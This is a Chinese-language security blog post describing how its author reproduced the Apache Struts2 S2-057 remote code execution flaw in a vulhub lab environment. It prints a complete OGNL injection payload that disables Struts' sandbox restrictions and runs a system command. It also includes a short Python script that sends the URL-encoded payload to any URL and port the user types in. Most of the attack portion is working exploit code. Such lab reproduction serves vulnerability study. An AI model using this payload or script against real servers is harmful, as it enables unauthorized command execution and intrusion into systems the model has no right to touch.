<!DOCTYPE html><html lang="zh_CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> s2-057 · Exi1Sh0w's Blog</title><meta name="description" content="努力努力再努力..."><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/favicon.png"><link rel="stylesheet" href="/css/jekyll.css"><!--[if lt IE 9]>
<script src="js/html5shiv.min.js"></script>
<script src="js/respond.min.js"></script>
<![endif]--><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Exi1Sh0w's Blog" type="application/atom+xml">
</head><body><header class="row-flex-row limit-width vh-center"><a href="/" class="logo"><img src="/favicon.png"></a><nav><ul class="nav-list"><li class="nav-list-item"><a href="/" class="nav-link">Home</a></li><li class="nav-list-item"><a href="/archives/" class="nav-link active">   Blog</a></li><li class="nav-list-item"><a href="https://github.com/exi1sh0w" target="_blank" class="nav-link">github</a></li><li class="nav-list-item"><a href="/atom.xml" class="nav-link">rss</a></li></ul></nav></header><div class="container limit-width"><section class="row-flex-row"><div class="post"><article class="post-block"><h2 class="post-title"><a href="/2018/08/28/s2-057/" class="post-title-link">s2-057</a></h2><div class="post-meta"><div class="post-time">星期二, 八月 28日 2018</div></div><div class="post-content"><h1 id="前两天发现P牛的vulhub上更新了S2-057的dockerfile，立马更新下来把玩一下。"><a href="#前两天发现P牛的vulhub上更新了S2-057的dockerfile，立马更新下来把玩一下。" class="headerlink" title="前两天发现P牛的vulhub上更新了S2-057的dockerfile，立马更新下来把玩一下。"></a>前两天发现P牛的vulhub上更新了S2-057的dockerfile，立马更新下来把玩一下。</h1><h2 id="首先搭建环境…"><a href="#首先搭建环境…" class="headerlink" title="首先搭建环境…"></a>首先搭建环境…</h2><p>使用的操作系统: ubuntu18.04</p>
<p>根据步骤顺利完成安装</p>
<p><img src="/img/s2-57/1.png" alt="imange"></p>
<h2 id="这边个人遇到了个小麻烦"><a href="#这边个人遇到了个小麻烦" class="headerlink" title="这边个人遇到了个小麻烦:"></a>这边个人遇到了个小麻烦:</h2><p>单纯的复制P牛给出的Payload是无法成功的(这点我测试了好几次，一度以为自己的电脑坏了，黏贴复制过程中出错…)</p>
<p>后来查看BurpSuite抓包内容，发现其实并没有按照复制的内容进行get请求</p>
<p><img src="%5Cimg%5Cs2-57%5C2.png" alt="avatar"></p>
<p>可以看到“（”后面的内容消失了，而测试payload是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;</span><br><span class="line">(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct&#x3D;#request[&#39;struts.valueStack&#39;].context).(#cr&#x3D;#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou&#x3D;#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a&#x3D;@java.lang.Runtime@getRuntime().exec(&#39;id&#39;)).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))&#125;</span><br></pre></td></tr></table></figure>

<p>推测是因为#这个符号作怪(了解SQL注入的大佬应该了解O(∩_∩)O)</p>
<p>使用hackbar的URLencode模块加密，成功。</p>
<p><img src="/img/s2-57/3.png" alt="avatar"></p>
<p><img src="/img/s2-57/4.png" alt="avatar"></p>
<p>2018/8/30 22:34小更新一下..</p>
<p>主要是网上的POC都蛮复杂的，自己写了个简单的验证</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"/struts2-showcase/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23a.getInputStream%28%29%29%29%7D/actionChain1.action"</span></span><br><span class="line"></span><br><span class="line">website = input(<span class="string">"请输入url...:"</span>)</span><br><span class="line"></span><br><span class="line">port = input(<span class="string">"请输入端口..."</span>)</span><br><span class="line"></span><br><span class="line">result = website + <span class="string">":"</span> + port</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">"http://"</span> <span class="keyword">not</span> <span class="keyword">in</span> website:</span><br><span class="line"></span><br><span class="line">    result = <span class="string">"http://"</span> + website + <span class="string">":"</span> + port</span><br><span class="line"></span><br><span class="line">conn = requests.options(result+payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> conn.status_code == <span class="number">200</span>:</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'ok'</span>)</span><br><span class="line"></span><br><span class="line">    print(conn.url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'Oops..好像不行哦..'</span>)</span><br></pre></td></tr></table></figure>

</div></article><div class="pagination"><a href="/2018/08/30/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E4%B8%80%E4%BA%9B%E5%B0%8F%E5%B7%A5%E5%85%B7/" class="pagination-prev">PREV</a><span class="pagination-next">NEXT</span></div><div class="comments"></div></div><aside class="sidebar"><h3>最新文章</h3><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/02/05/upload%E6%80%BB%E7%BB%93/">upload总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/26/WebLogic-wls9-async-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">WebLogic_wls9-async_反序列化漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/06/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/">Nodejs的一些问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/02/xss%E8%AE%B0%E5%BD%95/">xss记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/15/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">逻辑漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/06/%E5%90%8E%E9%97%A8%E5%BD%92%E7%B1%BB/">后门归类</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/16/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传的攻击/防御</a></li></ul></aside></section></div><div class="extra"></div><footer class="footer"><div class="row-flex-row limit-width vh-center"><div class="copyright"><P>© 2020 <a href="/">Exi1Sh0w</P></div></div></footer><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-80781234-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "//hm.baidu.com/hm.js?ee75cf111111aa99f8540efa2570970";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script></body></html>